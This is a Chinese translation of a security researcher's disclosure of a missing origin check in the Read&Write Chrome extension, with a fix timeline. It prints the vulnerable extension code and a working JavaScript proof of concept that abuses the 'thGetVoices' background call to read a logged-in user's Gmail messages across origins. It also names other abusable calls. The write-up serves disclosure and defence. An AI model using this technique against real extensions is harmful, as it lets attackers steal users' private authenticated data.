> 原文链接: https://www.anquanke.com//post/id/147167 


# 通过Chrome扩展应用的同源策略绕过漏洞读取用户电子邮件


                                阅读量   
                                **91412**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者Matthew Bryant，文章来源：thehackerblog.com
                                <br>原文地址：[https://thehackerblog.com/reading-your-emails-with-a-readwrite-chrome-extension-same-origin-policy-bypass-8-million-users-affected/index.html](https://thehackerblog.com/reading-your-emails-with-a-readwrite-chrome-extension-same-origin-policy-bypass-8-million-users-affected/index.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p2.ssl.qhimg.com/t01a071525837a7a9ea.jpg)](https://p2.ssl.qhimg.com/t01a071525837a7a9ea.jpg)



## 归纳

由于在从常规网页传递的消息中缺乏适当的origin检查，网页能够通过[Read&amp;Write Chrome扩展](https://chrome.google.com/webstore/detail/readwrite-for-google-chro/inoeonmfapjbbkmdafoankkfajkcphgd?hl=en)(易受攻击的版本1.8.0.139)调用敏感的后台API。这些API中的很多都允许危险的操作，这些操作并不意味着可以通过互联网上的任意网页进行调用。例如，带有方法名“thGetVoice”的后台API调用允许提供一个任意URL，该URL将由扩展检索，并通过“postMessage”返回响应。通过滥用此调用，攻击者可以劫持该扩展，从而使用受害者经过身份验证的会话从其他网站读取数据。作为一个PoC，我创建了一个利用，当Read&amp;Write扩展安装时，将窃取和显示所有用户的电子邮件。这当然不是Gmail中的漏洞，但是可以使用这个漏洞进行利用。请参阅下面的视频PoC来演示此问题。

这个拓展应用的作者[texthelp](https://www.texthelp.com/en-us/)公司迅速修补并在下一个工作日发布了一个补丁(干得好！)。因此，扩展的最新版本不再容易受到此问题的影响。他们还表现出真正的兴趣和关心补救扩展中的进一步问题，并表示他们将进一步加强代码库。



## 技术说明

Read&amp;Write Chrome扩展使用内容脚本“inject.js”将自定义工具栏注入到各种在线文档页面中，如Google Docs。默认情况下，该内容脚本被注入到所有HTTP和HTTPS源中。扩展清单中的以下摘录说明了这一点：

```
...trimmed for brevity...
  "content_scripts": [
    `{`
      "matches": [ "https://*/*", "http://*/*" ],
      "js": [ "inject.js" ],
      "run_at": "document_idle",
      "all_frames": true
    `}`
  ],
...trimmed for brevity...
```

在“inject.js”文件中，有一个事件监听器，用于监听被注入注入网页使用postMessage发送的消息：

```
window.addEventListener("message", this.onMessage)
```

这将在网页窗口发送任何postMessage消息时调用“this.onMessage”函数。以下是这个功能的代码：

```
function onMessage() `{`
    void 0 != event.source &amp;&amp; void 0 != event.data &amp;&amp; event.source == window &amp;&amp; "1757FROM_PAGERW4G" == event.data.type &amp;&amp; ("connect" == event.data.command ? chrome.extension.sendRequest(event.data, onRequest) : "ejectBar" == event.data.command ? ejectBar() : "th-closeBar" == event.data.command ? chrome.storage.sync.set(`{`
        enabledRW4GC: !1
    `}`) : chrome.extension.sendRequest(event.data, function(e) `{`
        window.postMessage(e, "*")
    `}`))
`}`
```

在上面的代码片段中，可以看到该函数将通过“chrome.extendsion.sendRequest”将所有接收到的postMessage消息传递到后台页面。此外，对这些消息的响应将传回“onMessage”函数，然后传回网页。这实际上构造了一个代理，它允许常规Web页面向Read&amp;Write后台页面发送消息。

Read&amp;Write有多个后台页面，可以在扩展名清单的摘录中看到：

```
...trimmed for brevity...
"background": `{`
  "scripts": [
    "assets/google-analytics-bundle.js",
    "assets/moment.js",
    "assets/thFamily3.js",
    "assets/thHashing.js",
    "assets/identity.js",
    "assets/socketmanager.js",
    "assets/thFunctionManager.js",
    "assets/equatio-latex-extractor.js",
    "assets/background.js",
    "assets/xmlIncludes/linq.js",
    "assets/xmlIncludes/jszip.js",
    "assets/xmlIncludes/jszip-load.js",
    "assets/xmlIncludes/jszip-deflate.js",
    "assets/xmlIncludes/jszip-inflate.js",
    "assets/xmlIncludes/ltxml.js",
    "assets/xmlIncludes/ltxml-extensions.js",
    "assets/xmlIncludes/testxml.js"
  ]
`}`,
...trimmed for brevity...
```

虽然有很多读取消息的后台页面（以及通过这些消息调用的许多函数），但我们将专注于立即可利用的示例。以下是文件“background.js”的摘录：

```
...trimmed for brevity...
chrome.extension.onRequest.addListener(function(e, t, o) `{`
...trimmed for brevity...
if ("thGetVoices" === e.method &amp;&amp; "1757FROM_PAGERW4G" == e.type) `{`
    if (g_voices.length &gt; 0 &amp;&amp; "true" !== e.payload.refresh) return void o(`{`
        method: "thGetVoices",
        type: "1757FROM_BGRW4G",
        payload: `{`
            response: g_voices
        `}`
    `}`);
    var c = new XMLHttpRequest;
    c.open("GET", e.payload.url, !0), c.onreadystatechange = function() `{`
        4 == this.readyState &amp;&amp; 200 == this.status &amp;&amp; (g_voices = this.responseText.toString(), o(`{`
            method: "thGetVoices",
            type: "1757FROM_BGRW4G",
            payload: `{`
                response: g_voices
            `}`
        `}`))
    `}`, c.send()
`}`
...trimmed for brevity...
```

上面的代码片断显示，当“chrome.extension.onRequest”侦听器的“method”设置为“thGetVoices”，“type”设置为“1757FROM_PAGERW4G”，并且被一个事件触发时，将执行代码片段。如果事件的“payload.refresh”设置为字符串“true”，那么XMLHTTPRequest将通过GET触发“payload.url”中指定的URL。在XMLHTTPRequest以200的状态码完成时，将使用请求的responseText生成响应消息。

通过滥用这个调用，我们可以用一个任意的URL向后台页面发送一条消息，这个URL将被HTTP响应主体回复。该请求将使用受害者的Cookie执行，因此将允许任意网页上的有效内容从其他网络来源窃取内容。以下payload是这个概念的PoC示例：

```
function exploit_get(input_url) `{`
    return new Promise(function(resolve, reject) `{`
        var delete_callback = false;
        var event_listener_callback = function(event) `{`
            if ("data" in event &amp;&amp; event.data.payload.response) `{`
                window.removeEventListener("message", event_listener_callback, false);
                resolve(event.data.payload.response);
            `}`
        `}`;
        window.addEventListener("message", event_listener_callback, false);
        window.postMessage(`{`
            type: "1757FROM_PAGERW4G",
            "method": "thGetVoices",
            "payload": `{`
                "refresh": "true",
                "url": input_url
            `}`
        `}`, "*");
    `}`);
`}`
setTimeout(function() `{`
    exploit_get("https://mail.google.com/mail/u/0/h/").then(function(response_body) `{`
        alert("Gmail emails have been stolen!");
        alert(response_body);
    `}`);
`}`, 1000);
```

上述攻击代码显示，可以通过这个漏洞读取跨源响应。在这个例子中，提供了Gmail“Simple HTML”版本的端点。上述payload可以托管在任何网站，它将能够读取登录到Gmail的用户的电子邮件。这是通过使用具有适当payload集的postMessage发出消息并为响应消息添加事件侦听器来完成的。通过“exploit_get()”函数返回的一连串JavaScript promise，我们可以从用户经过身份验证的任何站点窃取数据(假设可以通过HTTP GET访问这些数据，而不需要任何特殊的头文件)。

虽然上述示例引用了“thGetVoices”后台方法调用，但这只是调用这些后台页面API时发生的漏洞之一。除了使用这个调用之外，还有一些可以被利用的漏洞例子如下：

> thExtBGAjaxRequest”，攻击者可以使用它执行带有参数的“application/x-www-form-urlencoded；charset=UTF-8”类型的任意POST请求并读取响应体。
“OpenTab”，它允许攻击者对通常仅限于网页的任意位置打开大量的选项卡。
 

## PoC视频

[https://youtu.be/F0M_WuBGUV4](https://youtu.be/F0M_WuBGUV4)

## 

## 根源与修复思路

这个漏洞展示了一个通常与扩展一起发生的常见的安全隐患。为了更灵活地使用ChromeExtensionAPI，许多扩展将构建一个桥接，允许从常规的Web上下文调用后台页面。许多Chrome扩展开发人员忘记验证消息的来源，以防止任意站点调用潜在敏感的功能。这样可以确保所有调用都是由用户操作触发的，而不是由攻击者伪造的。



## timeline

6月2日（星期五晚上）：报告漏洞。<br>
6月3日：确认收到问题，确认将于周一发布。<br>
6月4日（星期一）：补丁发布漏洞。
